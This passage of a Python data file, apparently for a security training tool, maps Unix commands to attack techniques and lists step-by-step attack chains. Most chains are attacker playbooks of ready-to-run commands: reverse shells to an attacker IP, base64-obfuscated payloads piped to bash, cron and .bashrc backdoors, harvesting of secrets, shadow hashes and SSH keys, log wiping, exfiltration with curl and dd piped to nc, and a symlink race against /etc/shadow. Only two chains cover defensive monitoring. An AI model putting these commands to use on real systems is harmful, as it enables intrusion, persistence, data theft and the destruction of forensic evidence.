        "related_commands": ["du", "mount", "lsblk", "stat"],
    },
    "date": {
        "hat": "red",
        "security_intent": "Displays and sets system time. Attackers manipulate timestamps to confuse log correlation, invalidate TLS certificates, and bypass time-based access controls.",
        "attack_vectors": ["timestamp manipulation for log confusion", "certificate validity bypass", "time-based access control evasion"],
        "defense_use": "Monitoring for unexpected time changes during incident response.",
        "mitre_tags": ["T1070.006", "T1562"],
        "threat_level": 3,
        "related_commands": ["timedatectl", "ntpdate", "hwclock", "ls"],
    },
    "which": {
        "hat": "red",
        "security_intent": "Finds executable locations. Used during recon to discover available tools on a compromised system, and to identify PATH hijacking opportunities.",
        "attack_vectors": ["tool availability reconnaissance", "PATH hijacking preparation"],
        "defense_use": "Verifying which binary executes to detect PATH hijacking.",
        "mitre_tags": ["T1082", "T1574.007"],
        "threat_level": 2,
        "related_commands": ["whereis", "find", "type", "hash"],
    },
    "mv": {
        "hat": "red",
        "security_intent": "Moves and renames files. Used to rename malicious binaries to look like legitimate system files (masquerading), and to relocate payloads to execution paths.",
        "attack_vectors": ["binary masquerading", "payload relocation to execution path"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1036.003"],
        "threat_level": 2,
        "related_commands": ["cp", "ln", "chmod", "find"],
    },
    "ls": {
        "hat": "red",
        "security_intent": "`ls -la` reveals hidden files (dotfiles), permissions, timestamps, and file ages — the starting point of every filesystem recon session post-exploitation.",
        "attack_vectors": ["filesystem enumeration", "hidden file discovery", "permission reconnaissance"],
        "defense_use": "Manual filesystem auditing.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["find", "stat", "cat", "dir"],
    },
    "cd": {
        "hat": "gray",
        "security_intent": "Changes directory. Directory traversal attacks (`../../etc/passwd`) stem from improper path validation in applications that don't canonicalize input.",
        "attack_vectors": [],
        "defense_use": "None significant.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["ls", "pwd", "find", "realpath"],
    },
    "tty": {
        "hat": "red",
        "security_intent": "Reports the terminal device. Post-exploitation: identifies if running in an interactive TTY or a non-TTY context (web shell), which determines which techniques are available.",
        "attack_vectors": ["terminal type detection for technique selection", "TTY upgrade assessment"],
        "defense_use": "Detecting unexpected TTY sessions.",
        "mitre_tags": ["T1082"],
        "threat_level": 2,
        "related_commands": ["stty", "who", "ps", "script"],
    },
    "rmdir": {
        "hat": "gray",
        "security_intent": "Removes empty directories. Used in cleanup phases of attacks to remove staging directories.",
        "attack_vectors": [],
        "defense_use": "None significant.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["rm", "mkdir", "find", "unlink"],
    },
    "fold": {"hat": "gray", "security_intent": "Wraps long lines. Formats base64-encoded payloads to specific line lengths required by certain protocols.", "attack_vectors": [], "defense_use": "Formatting certificates and encoded data.", "mitre_tags": [], "threat_level": 1, "related_commands": ["base64", "fmt", "cut", "tr"]},
    "pr": {"hat": "gray", "security_intent": "Formats text for printing. Minimal security relevance beyond formatting audit reports.", "attack_vectors": [], "defense_use": "Formatting audit reports.", "mitre_tags": [], "threat_level": 1, "related_commands": ["fmt", "fold", "cat", "nl"]},
    "false": {"hat": "gray", "security_intent": "Returns exit code 1. Used in security scripts to force failure on certain paths. Understanding exit codes is fundamental to exploit script logic.", "attack_vectors": [], "defense_use": "Script logic control.", "mitre_tags": [], "threat_level": 1, "related_commands": ["true", "test", "exit"]},
    "true": {"hat": "gray", "security_intent": "Returns exit code 0. Used in attack scripts to reset exit status and prevent error-detection logic from triggering.", "attack_vectors": ["resetting exit codes to bypass error checking"], "defense_use": "Script logic control.", "mitre_tags": [], "threat_level": 1, "related_commands": ["false", "test", "exit"]},
    "exit": {"hat": "gray", "security_intent": "Terminates a shell or script. Attackers exit cleanly after payload execution, often after running `history -c` first.", "attack_vectors": [], "defense_use": "None significant.", "mitre_tags": [], "threat_level": 1, "related_commands": ["logout", "history", "nohup", "trap"]},
    "logout": {"hat": "gray", "security_intent": "Logs out of current session. After a successful attack, clean logout avoids leaving an open shell detectable by monitoring.", "attack_vectors": [], "defense_use": "Session management.", "mitre_tags": [], "threat_level": 1, "related_commands": ["exit", "history", "who", "last"]},
    "expand": {"hat": "gray", "security_intent": "Converts tabs to spaces. Used for code normalization in diff-based integrity checking.", "attack_vectors": [], "defense_use": "Code normalization.", "mitre_tags": [], "threat_level": 1, "related_commands": ["unexpand", "cat", "tr", "sed"]},
    "unexpand": {"hat": "gray", "security_intent": "Converts spaces to tabs. Minor use in whitespace-dependent parsing exploitation.", "attack_vectors": [], "defense_use": "None significant.", "mitre_tags": [], "threat_level": 1, "related_commands": ["expand", "tr", "cat", "sed"]},
    "fmt": {"hat": "gray", "security_intent": "Text formatter. Minimal security relevance.", "attack_vectors": [], "defense_use": "Formatting security reports.", "mitre_tags": [], "threat_level": 1, "related_commands": ["pr", "fold", "cat", "nl"]},
    "ptx": {"hat": "gray", "security_intent": "Permuted index generator. Minimal security relevance.", "attack_vectors": [], "defense_use": "None significant.", "mitre_tags": [], "threat_level": 1, "related_commands": ["sort", "grep", "cut"]},
    "tsort": {"hat": "gray", "security_intent": "Topological sort. Conceptually relevant to dependency analysis — understanding dependency graphs is key to supply chain attack analysis.", "attack_vectors": [], "defense_use": "Dependency graph analysis for supply chain security.", "mitre_tags": [], "threat_level": 1, "related_commands": ["sort", "comm", "diff"]},
    "dircolors": {"hat": "gray", "security_intent": "Sets terminal color codes for ls. Attackers can modify .dircolors to visually camouflage malicious files to blend with legitimate ones.", "attack_vectors": ["visual camouflage of malicious files"], "defense_use": "None significant.", "mitre_tags": ["T1036"], "threat_level": 1, "related_commands": ["ls", "dir", "vdir"]},
    "vdir": {"hat": "gray", "security_intent": "Verbose directory listing (ls -l equivalent). Useful for permission auditing.", "attack_vectors": [], "defense_use": "Permission auditing.", "mitre_tags": [], "threat_level": 1, "related_commands": ["ls", "dir", "stat", "find"]},
    "dir": {"hat": "gray", "security_intent": "Directory listing. Minimal security relevance beyond basic recon.", "attack_vectors": [], "defense_use": "Directory auditing.", "mitre_tags": [], "threat_level": 1, "related_commands": ["ls", "vdir", "find", "stat"]},
    "basename": {"hat": "gray", "security_intent": "Extracts filename from path. Used in security scripts for path manipulation and traversal validation.", "attack_vectors": [], "defense_use": "Path validation in security scripts.", "mitre_tags": [], "threat_level": 1, "related_commands": ["dirname", "realpath", "pathchk"]},
    "dirname": {"hat": "gray", "security_intent": "Extracts directory component from path. Used in security scripts for path traversal validation.", "attack_vectors": [], "defense_use": "Path validation.", "mitre_tags": [], "threat_level": 1, "related_commands": ["basename", "realpath", "pathchk"]},
    "numfmt": {"hat": "gray", "security_intent": "Formats numbers with unit prefixes. Used for formatting file size output in security reports.", "attack_vectors": [], "defense_use": "None significant.", "mitre_tags": [], "threat_level": 1, "related_commands": ["printf", "expr", "awk"]},
    "paste": {"hat": "gray", "security_intent": "Merges lines from multiple files. Used to combine credential lists or build attack input files.", "attack_vectors": [], "defense_use": "Combining security data for correlation.", "mitre_tags": [], "threat_level": 1, "related_commands": ["join", "cut", "sort", "cat"]},
    "join": {"hat": "gray", "security_intent": "Joins files on a common field. Used to correlate usernames with privileges from different data sources.", "attack_vectors": [], "defense_use": "Correlating security event data.", "mitre_tags": [], "threat_level": 1, "related_commands": ["paste", "cut", "comm", "sort"]},
    "nl": {"hat": "gray", "security_intent": "Numbers lines in files. Used for referencing specific lines in audit logs.", "attack_vectors": [], "defense_use": "Log file analysis with line references.", "mitre_tags": [], "threat_level": 1, "related_commands": ["cat", "head", "tail", "grep"]},
    "[": {"hat": "gray", "security_intent": "The test command. Evaluates conditionals in scripts — fundamental to exploit script logic and security automation.", "attack_vectors": [], "defense_use": "Security script conditionals.", "mitre_tags": [], "threat_level": 1, "related_commands": ["test", "if", "bash", "expr"]},
}

ATTACK_CHAINS = [
    {
        "name": "Reverse Shell via Named Pipe",
        "hat": "black",
        "scenario": "You have RCE on a target (web shell, command injection, etc.) but no interactive shell. You need a full TTY back to your machine.",
        "commands": ["mkfifo", "nohup", "echo", "chmod", "bash"],
        "steps": [
            {
                "step": "attacker — open listener",
                "action": "Start a netcat listener on your machine before triggering the shell",
                "example": "nc -lvnp 4444",
                "note": "Run this first on your attacker VM. Replace 4444 with any open port."
            },
            {
                "step": "mkfifo — create the pipe",
                "action": "Create a named pipe as the bidirectional communication channel",
                "example": "mkfifo /tmp/.f",
                "note": "Dot prefix hides it from casual `ls`. Check /tmp is writable first."
            },
            {
                "step": "nc + /bin/sh — connect back",
                "action": "Wire the pipe to a shell and connect to attacker machine",
                "example": "nc 192.168.1.100 4444 </tmp/.f | /bin/sh >/tmp/.f 2>&1",
                "note": "Replace 192.168.1.100 with your attacker IP. This is the classic mkfifo reverse shell one-liner."
            },
            {
                "step": "nohup — survive logout",
                "action": "Wrap everything so it survives session termination",
                "example": "nohup bash -c 'mkfifo /tmp/.f; nc 192.168.1.100 4444 </tmp/.f | /bin/sh >/tmp/.f 2>&1' &",
                "note": "The `&` backgrounds it, nohup ignores SIGHUP. Process survives when the parent session dies."
            },
            {
                "step": "attacker — upgrade to TTY",
                "action": "Upgrade the raw shell to a full interactive TTY",
                "example": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm",
                "note": "Without TTY upgrade, tab-complete, Ctrl+C, and vim don't work."
            }
        ]
    },
    {
        "name": "Post-Exploitation Recon",
        "hat": "red",
        "scenario": "You just landed a shell. You have ~60 seconds before someone notices. Run this chain in order to map the environment before moving forward.",
        "commands": ["whoami", "hostname", "arch", "nproc", "which", "printenv"],
        "steps": [
            {
                "step": "whoami + id",
                "action": "Confirm current user identity and group memberships",
                "example": "whoami && id",
                "note": "id shows if you're in sudo, docker, or adm groups — all privesc paths."
            },
            {
                "step": "uname + arch + nproc",
                "action": "Fingerprint the kernel, CPU architecture, and core count",
                "example": "uname -a && arch && nproc",
                "note": "Kernel version determines which local exploits apply. Arch determines payload format."
            },
            {
                "step": "hostname + ip",
                "action": "Map network position — hostname and all interfaces",
                "example": "hostname && ip a 2>/dev/null || ifconfig",
                "note": "Multiple interfaces = likely pivot point into another network segment."
            },
            {
                "step": "printenv — credential sweep",
                "action": "Dump environment for tokens, API keys, passwords",
                "example": "printenv | grep -iE 'pass|key|token|secret|api|auth|cred'",
                "note": "CI/CD systems, Docker containers, and app servers routinely leak credentials here."
            },
            {
                "step": "which — available tools",
                "action": "Discover what tools are available for next steps",
                "example": "which nc ncat curl wget python3 python perl ruby gcc make 2>/dev/null",
                "note": "Available tools determine your exfil method and whether you can compile exploits."
            },
            {
                "step": "cat /etc/passwd — user list",
                "action": "Extract all local users; find accounts with shells",
                "example": "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1,6,7",
                "note": "Accounts with /bin/bash are lateral movement targets."
            }
        ]
    },
    {
        "name": "SUID / Privilege Escalation",
        "hat": "black",
        "scenario": "You're a low-privilege user and need root. You're looking for misconfigurations — SUID binaries, writable paths, weak sudo rules.",
        "commands": ["find", "su", "runcon", "chroot", "whoami"],
        "steps": [
            {
                "step": "find — SUID binaries",
                "action": "Discover all SUID binaries on the system",
                "example": "find / -perm -4000 -type f 2>/dev/null",
                "note": "Cross-reference results at gtfobins.github.io — many standard binaries have known SUID escalation paths."
            },
            {
                "step": "find — SGID binaries",
                "action": "Find SGID binaries (group-level privilege)",
                "example": "find / -perm -2000 -type f 2>/dev/null",
                "note": "SGID on binaries like `write` or `wall` can be chained into escalation."
            },
            {
                "step": "find — writable dirs",
                "action": "Locate world-writable directories for payload placement",
                "example": "find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys",
                "note": "Drop payloads in writable dirs, then trigger via SUID binary that reads from there."
            },
            {
                "step": "sudo -l",
                "action": "Check what the current user can run as root via sudo",
                "example": "sudo -l 2>/dev/null",
                "note": "(NOPASSWD) entries are immediate escalation. Check gtfobins for each allowed binary."
            },
            {
                "step": "su — credential test",
                "action": "Test common/found credentials against root",
                "example": "echo 'password123' | su -c whoami root 2>/dev/null",
                "note": "After finding hashes in /etc/shadow, crack them offline then test here."
            },
            {
                "step": "verify escalation",
                "action": "Confirm you achieved root after successful technique",
                "example": "whoami && id && cat /etc/shadow | head -3",
                "note": "Reading /etc/shadow confirms true root — not just a misleading prompt."
            }
        ]
    },
    {
        "name": "Credential Harvesting",
        "hat": "red",
        "scenario": "You have a shell (any privilege level). Goal: gather credentials, tokens, and hashes before the window closes.",
        "commands": ["cat", "grep", "cut", "printenv", "find", "sort"],
        "steps": [
            {
                "step": "printenv — env secrets",
                "action": "Dump all environment variables and filter for credentials",
                "example": "printenv | sort | grep -iE 'pass|secret|key|token|auth|api|db_|database|aws|gcp'",
                "note": "Docker containers and Kubernetes pods are notorious for leaking secrets this way."
            },
            {
                "step": "find — dotenv files",
                "action": "Search for .env and config files containing credentials",
                "example": "find / -name '.env' -o -name '*.env' -o -name 'config.php' -o -name 'database.yml' 2>/dev/null | head -20",
                "note": "Web application roots (/var/www, /srv, /opt) are the richest hunting ground."
            },
            {
                "step": "grep — inline credentials",
                "action": "Search source code and configs for hardcoded passwords",
                "example": "grep -rn --include='*.{php,py,js,rb,env,conf,cfg,xml,yaml,yml}' -iE '(password|passwd|pwd|secret)\\s*[=:]' /var/www /opt /srv 2>/dev/null | head -30",
                "note": "Look for connection strings like `mysql://user:pass@host/db`."
            },
            {
                "step": "cat /etc/shadow",
                "action": "Dump password hashes (requires root or shadow group membership)",
                "example": "cat /etc/shadow 2>/dev/null | grep -v '!\\|\\*' | cut -d: -f1,2",
                "note": "Non-empty hash (not ! or *) = crackable. Feed to hashcat: `hashcat -m 1800 hashes.txt wordlist.txt`"
            },
            {
                "step": "find — SSH private keys",
                "action": "Search for unprotected private keys",
                "example": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null",
                "note": "Check ~/.ssh/known_hosts too — reveals other machines this host connects to."
            },
            {
                "step": "find — browser / shell history",
                "action": "Extract credentials from command history and browser storage",
                "example": "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|mysql|psql|redis|mongo|curl.*-u|curl.*-H.*auth'",
                "note": "Admins frequently type passwords directly in commands. History is a goldmine."
            }
        ]
    },
    {
        "name": "Payload Obfuscation Pipeline",
        "hat": "black",
        "scenario": "Your payload is being blocked by AV or WAF signature matching. You need to encode it so it's not recognized, but still executes correctly.",
        "commands": ["base64", "base32", "tr", "xxd", "od"],
        "steps": [
            {
                "step": "base64 — basic encode",
                "action": "Base64-encode the payload for transport or obfuscation",
                "example": "echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64 -w0",
                "note": "The `-w0` disables line wrapping. Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8...`"
            },
            {
                "step": "base64 — decode and execute",
                "action": "On target: decode the payload and pipe directly to bash",
                "example": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==' | base64 -d | bash",
                "note": "Many WAFs don't inspect base64-encoded pipe-to-bash patterns."
            },
            {
                "step": "tr — character substitution",
                "action": "Add a simple substitution layer on top of base64",
                "example": "echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64 | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
                "note": "ROT13 on base64 output. Reverse: pipe through `tr 'N-ZA-Mn-za-m' 'A-Za-z'` then `base64 -d`"
            },
            {
                "step": "xxd — hex encode",
                "action": "Convert payload to hex for environments that allow hex but not base64",
                "example": "echo 'id' | xxd -p | tr -d '\\n'",
                "note": "Decode on target: `echo '6964' | xxd -r -p | bash` — useful in SQL injection contexts."
            },
            {
                "step": "verify encoding",
                "action": "Always verify your payload decodes correctly before sending",
                "example": "echo 'ENCODED_PAYLOAD' | base64 -d\n# or for xxd:\necho 'HEX_PAYLOAD' | xxd -r -p",
                "note": "A broken payload wastes your access window. Test decode locally first."
            }
        ]
    },
    {
        "name": "Anti-Forensics / Log Clearing",
        "hat": "black",
        "scenario": "You've completed your objective and need to erase evidence of access before leaving. Goal: make forensic timeline reconstruction impossible.",
        "commands": ["truncate", "shred", "dd", "unlink", "history"],
        "steps": [
            {
                "step": "history -c",
                "action": "Clear current bash session history from memory",
                "example": "history -c && history -w",
                "note": "`-c` clears memory, `-w` writes the empty list to ~/.bash_history. Do this first before anything else."
            },
            {
                "step": "truncate — log files",
                "action": "Silently empty log files without deleting them (deletion is more detectable)",
                "example": "truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/kern.log 2>/dev/null",
                "note": "The file inode remains. Size goes to 0. Less suspicious than deletion. Requires write access to /var/log."
            },
            {
                "step": "shred — payload files",
                "action": "Securely overwrite and delete files you dropped on the system",
                "example": "shred -vzu -n 3 /tmp/.payload.sh /tmp/.f 2>/dev/null",
                "note": "`-z` adds a final zero-pass, `-u` unlinks after shredding. On SSDs, shred is less reliable due to wear leveling."
            },
            {
                "step": "dd — targeted log wipe",
                "action": "Overwrite specific log content with zeros at the block level",
                "example": "dd if=/dev/zero of=/var/log/auth.log bs=1 count=$(stat -c%s /var/log/auth.log) 2>/dev/null",
                "note": "Preserves file size (less suspicious than truncate). Requires knowing the original size."
            },
            {
                "step": "ln / unlink — cover tracks",
                "action": "Remove entries from directories without touching inode data",
                "example": "unlink /tmp/.f\nunlink /tmp/.payload.sh",
                "note": "If shred fails (permissions), unlink removes the directory entry. The data may be recoverable but the path is gone."
            },
            {
                "step": "check what remains",
                "action": "Verify your cleanup before leaving",
                "example": "find /tmp /var/tmp -newer /proc/1 -type f 2>/dev/null\nwho\nlast -n 5",
                "note": "Check last for your login entries — some logs survive truncate (journald binary logs, for example)."
            }
        ]
    },
    {
        "name": "Persistence via Cron + Bashrc",
        "hat": "black",
        "scenario": "You have shell access but it's unstable. You need guaranteed re-entry even if the current session dies and the system reboots.",
        "commands": ["nohup", "echo", "chmod", "nice", "mkfifo"],
        "steps": [
            {
                "step": "echo — inject cron job",
                "action": "Add a reverse shell to crontab so it fires every minute",
                "example": "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/192.168.1.100/4444 0>&1') | crontab -",
                "note": "The `(crontab -l; ...)` pattern preserves existing cron entries. Remove after use."
            },
            {
                "step": "echo — inject .bashrc",
                "action": "Plant a shell launcher in bash profile for next login trigger",
                "example": "echo 'nohup bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> ~/.bashrc",
                "note": "Fires every time the user opens a bash session. Subtle — doesn't require cron daemon."
            },
            {
                "step": "nohup — current session survival",
                "action": "Detach the current reverse shell from the session",
                "example": "nohup bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 60; done' &",
                "note": "The while loop auto-reconnects if the connection drops. Nice complement to cron."
            },
            {
                "step": "chmod — ensure payload executes",
                "action": "Make sure any dropped script has execute permission",
                "example": "chmod +x /tmp/.backdoor.sh && ls -la /tmp/.backdoor.sh",
                "note": "Also check if /tmp is mounted noexec: `mount | grep /tmp`. If so, use /dev/shm instead."
            },
            {
                "step": "nice — evade CPU detection",
                "action": "Run persistence at lowest priority to avoid anomaly detection",
                "example": "nice -n 19 nohup bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 120; done' &",
                "note": "Nice 19 = lowest CPU priority. The shell beacon won't spike CPU graphs that blue team monitors."
            }
        ]
    },
    {
        "name": "Data Exfiltration",
        "hat": "black",
        "scenario": "You found valuable data — configs, databases, source code. You need to extract it without triggering data-loss prevention or bandwidth alerts.",
        "commands": ["find", "cat", "dd", "split", "csplit", "base64"],
        "steps": [
            {
                "step": "du + find — identify targets",
                "action": "Find the richest directories and recently modified files",
                "example": "du -sh /home /var /opt /srv /etc 2>/dev/null | sort -rh | head -10\nfind / -newer /tmp/.marker -size +100k -type f 2>/dev/null | grep -v proc",
                "note": "Create /tmp/.marker with `touch /tmp/.marker` first. The find shows everything modified after your initial access."
            },
            {
                "step": "tar — archive the target",
                "action": "Package files into a single compressed archive",
                "example": "tar czf /tmp/.data.tgz /home/user/documents/ /var/www/html/config/ 2>/dev/null",
                "note": "Use a hidden filename. Compress first — helps with size limits and encoding overhead."
            },
            {
                "step": "split — chunk for size limits",
                "action": "Break the archive into chunks that bypass upload size restrictions",
                "example": "split -b 500k /tmp/.data.tgz /tmp/.chunk_",
                "note": "500k chunks stay under most WAF upload limits. Reassemble: `cat /tmp/.chunk_* > recovered.tgz`"
            },
            {
                "step": "base64 — encode for HTTP transport",
                "action": "Encode chunks as base64 for safe HTTP/DNS transport",
                "example": "for f in /tmp/.chunk_*; do base64 $f | curl -s -X POST -d @- http://192.168.1.100:8080/receive; done",
                "note": "On attacker: `nc -lvnp 8080 | base64 -d > recovered.tgz` or run a simple Python HTTP server."
            },
            {
                "step": "dd — alternate: raw stream",
                "action": "Stream raw disk data directly over network without writing temp files",
                "example": "dd if=/dev/sda bs=4M | gzip | nc 192.168.1.100 4445",
                "note": "Full disk image. Slower but captures everything including deleted files. Attacker receives: `nc -lvnp 4445 | gunzip > disk.img`"
            },
            {
                "step": "shred — cleanup after",
                "action": "Remove all temp files created during exfiltration",
                "example": "shred -zu /tmp/.data.tgz /tmp/.chunk_* 2>/dev/null",
                "note": "Clean up in reverse order of creation. Don't forget /tmp/.marker."
            }
        ]
    },
    {
        "name": "Symlink Attack (TOCTOU)",
        "hat": "black",
        "scenario": "A privileged process creates or writes to a predictable temp file path. You race it to replace the path with a symlink pointing to a sensitive target.",
        "commands": ["ln", "mktemp", "link", "unlink", "realpath"],
        "steps": [
            {
                "step": "identify the race condition",
                "action": "Find scripts or programs that create predictable temp files",
                "example": "strace -e openat,creat,open /path/to/privileged_script 2>&1 | grep '/tmp'",
                "note": "Look for patterns like `/tmp/backup_$$` or `/tmp/app_temp` — anything predictable."
            },
            {
                "step": "monitor the path",
                "action": "Watch for the temp file to appear",
                "example": "while [ ! -e /tmp/target_path ]; do :; done; ls -la /tmp/target_path",
                "note": "A busy-wait loop. When the file appears, you have microseconds to act before the process writes."
            },
            {
                "step": "ln -sf — plant the symlink",
                "action": "Replace the temp file path with a symlink to your target",
                "example": "ln -sf /etc/passwd /tmp/target_path\n# or for write-access to shadow:\nln -sf /etc/shadow /tmp/target_path",
                "note": "The privileged process now reads/writes your target instead of its temp file."
            },
            {
                "step": "automate the race",
                "action": "Script the unlink + relink loop to win the race reliably",
                "example": "while true; do\n  unlink /tmp/target_path 2>/dev/null\n  ln -sf /etc/shadow /tmp/target_path 2>/dev/null\ndone &",
                "note": "Run this background loop, then trigger the vulnerable script. The race window is usually large enough."
            },
            {
                "step": "realpath — defensive check",
                "action": "Verify where a path actually leads before trusting it",
                "example": "realpath /tmp/target_path\nreadlink -f /tmp/target_path",
                "note": "Blue team: any script handling temp files should call realpath() and verify it's not a symlink outside allowed dirs."
            }
        ]
    },
    {
        "name": "Sandbox / Chroot Escape",
        "hat": "black",
        "scenario": "You're inside a chroot jail or minimal container. The environment is stripped down. You need to break out to the real filesystem.",
        "commands": ["chroot", "su", "runcon", "find", "dd"],
        "steps": [
            {
                "step": "assess the jail",
                "action": "Map what's available inside the chroot environment",
                "example": "ls /bin /usr/bin /lib 2>/dev/null\ncat /proc/1/cgroup 2>/dev/null\ncat /proc/version 2>/dev/null",
                "note": "If /proc is mounted, you can read the real root filesystem through /proc/1/root/."
            },
            {
                "step": "proc escape — if /proc is mounted",
                "action": "Escape chroot via /proc/1/root symlink",
                "example": "ls /proc/1/root/\nchroot /proc/1/root /bin/bash",
                "note": "Classic chroot escape. Works when /proc is visible and you're root inside the jail."
            },
            {
                "step": "dd — read outside jail",
                "action": "If you have a device file, read raw disk to access files outside",
                "example": "dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head",
                "note": "Even without /proc, raw device access bypasses the chroot entirely."
            },
            {
                "step": "find — device files in jail",
                "action": "Check if any device files are mounted inside the jail",
                "example": "find / -type b -o -type c 2>/dev/null | head -20",
                "note": "Device files (b=block, c=char) are the most common chroot escape vector."
            },
            {
                "step": "runcon — SELinux context test",
                "action": "Attempt to execute with a different security context",
                "example": "runcon system_u:system_r:initrc_t:s0 /bin/bash 2>/dev/null",
                "note": "Only works if SELinux policy has gaps. Check with `sestatus` and `getenforce` first."
            }
        ]
    },
    {
        "name": "File Integrity Monitoring",
        "hat": "blue",
        "scenario": "You're hardening a Linux system and need to detect unauthorized changes — modified binaries, new files, tampered configs.",
        "commands": ["sha256sum", "md5sum", "b2sum", "comm", "find", "tail"],
        "steps": [
            {
                "step": "build file baseline",
                "action": "Create a sorted list of all critical files",
                "example": "find /bin /sbin /usr/bin /usr/sbin /etc /lib /lib64 -type f | sort > /root/baseline_filelist.txt\nwc -l /root/baseline_filelist.txt",
                "note": "Store this list on read-only media or a remote server — if stored locally, an attacker can update it."
            },
            {
                "step": "sha256sum — hash everything",
                "action": "Hash all files in the baseline list",
                "example": "sha256sum $(cat /root/baseline_filelist.txt) > /root/baseline.sha256 2>/dev/null\nwc -l /root/baseline.sha256",
                "note": "This takes a few minutes on a full system. For large systems, use b2sum (faster than SHA-256)."
            },
            {
                "step": "verify integrity",
                "action": "Check current state against the baseline — find modified files",
                "example": "sha256sum -c /root/baseline.sha256 2>/dev/null | grep -v OK",
                "note": "Any FAILED line = file was modified since baseline. Investigate immediately."
            },
            {
                "step": "comm — detect new files",
                "action": "Find files that were added after the baseline was built",
                "example": "find /bin /sbin /usr/bin /usr/sbin /etc -type f | sort > /tmp/current_filelist.txt\ncomm -13 /root/baseline_filelist.txt /tmp/current_filelist.txt",
                "note": "`comm -13` shows lines only in the second file = new files added since baseline."
            },
            {
                "step": "find — recently modified",
                "action": "Find files modified in the last 24 hours",
                "example": "find /etc /bin /usr/bin /sbin -mtime -1 -type f 2>/dev/null",
                "note": "Change -1 to -7 for weekly sweep. Attackers often backdoor binaries — any binary mtime change is suspicious."
            },
            {
                "step": "tail -f — live log watch",
                "action": "Monitor auth log in real time for active intrusion",
                "example": "tail -f /var/log/auth.log | grep -iE 'failed|invalid|error|sudo|su:'",
                "note": "Run this in a tmux pane during incident response. Failed logins + sudo abuse are the key signals."
            }
        ]
    },
    {
        "name": "Session & Process Monitoring",
        "hat": "blue",
        "scenario": "You suspect someone may be on the system. Enumerate all active sessions, unusual processes, and open connections before pulling the plug.",
        "commands": ["who", "pinky", "logname", "top", "uptime", "tty"],
        "steps": [
            {
                "step": "who + w",
                "action": "List all active sessions with login times and running commands",
                "example": "who -a && echo '---' && w",
                "note": "w shows what each session is currently executing. An idle shell with no command is suspicious."
            },
            {
                "step": "last — login history",
                "action": "Review recent login history for unusual access",
                "example": "last -n 20 | head -25",
                "note": "Look for: logins from unusual IPs, logins at odd hours, very short sessions (automated), or unknown usernames."
            },
            {
                "step": "ps — full process tree",
                "action": "Dump complete process tree to find rogue processes",
                "example": "ps auxf | grep -v '\\['\nps aux --sort=-%cpu | head -20",
                "note": "Processes with no tty (TTY=?) that aren't daemons are suspicious. Check parent PID (PPID) carefully."
            },
            {
                "step": "lsof — open network connections",
                "action": "List all processes with open network connections",
                "example": "lsof -i -n -P 2>/dev/null | grep -iE 'LISTEN|ESTABLISHED'\nss -tulpn",
                "note": "Unexpected ESTABLISHED connections to external IPs = active exfiltration or C2 channel."
            },
            {
                "step": "uptime — system load check",
                "action": "Check if load average is abnormally high",
                "example": "uptime && free -h && df -h",
                "note": "Cryptominers spike load average. Ransomware chews disk I/O. Both show up here."
            },
            {
                "step": "kill — terminate suspect process",
                "action": "Kill a suspicious process and verify it doesn't restart",
                "example": "kill -9 [PID]\nsleep 5 && ps aux | grep [PID]",
                "note": "If the process restarts automatically — there's a cron job, systemd unit, or bashrc keeping it alive."
            }
        ]
    },
    {
        "name": "SELinux Audit & Attack Surface",
        "hat": "black",
        "scenario": "Your target has SELinux enforcing. Before attempting bypasses, you need to understand what's enforced, what contexts exist, and where the gaps are.",
        "commands": ["runcon", "chcon", "chroot", "su", "find"],
        "steps": [
            {
                "step": "sestatus — check enforcement",
                "action": "Determine if SELinux is enforcing, permissive, or disabled",
                "example": "sestatus 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null",
                "note": "Permissive mode = logs violations but doesn't block. Effectively disabled for attackers."
            },
            {
                "step": "getenforce",
                "action": "Simple enforcing/permissive check (lighter than sestatus)",
                "example": "getenforce 2>/dev/null",
                "note": "If output is Permissive or Disabled, SELinux is not a barrier. Proceed normally."
            },
            {
                "step": "ls -Z — view file contexts",
                "action": "Inspect SELinux security labels on sensitive files",
                "example": "ls -Z /etc/shadow /bin/bash /etc/sudoers 2>/dev/null",
                "note": "Format: user:role:type:level. The `type` field is what policy rules match against."
            },
            {
                "step": "runcon — test context execution",
                "action": "Try running a shell with a different SELinux type",
                "example": "runcon -t initrc_t /bin/bash 2>/dev/null\nruncon system_u:system_r:unconfined_t:s0 /bin/bash 2>/dev/null",
                "note": "If it works without error, you've escaped your current context's restrictions."
            },
            {
                "step": "chcon — relabel a file",
                "action": "Change the SELinux label of a file to bypass access restrictions",
                "example": "chcon -t bin_t /tmp/.payload 2>/dev/null && ls -Z /tmp/.payload",
                "note": "Relabeling a script to bin_t may allow execution in contexts that restrict user_tmp_t."
            }
        ]
    },
]

# ---------------------------------------------------------------------------
# COMMAND_EXTRAS — toolbook layer: quick examples + combinations with other tools
# These are merged into each video entry at build time.
# ---------------------------------------------------------------------------
COMMAND_EXTRAS = {
    "xxd": {
        "quick_use": [
            "xxd /bin/bash | head -3                    # inspect ELF header",
            "echo 'id' | xxd -p | tr -d '\\n'          # hex-encode a command",
            "echo '696400' | xxd -r -p | bash           # decode hex and execute",
        ],
        "combinations": [
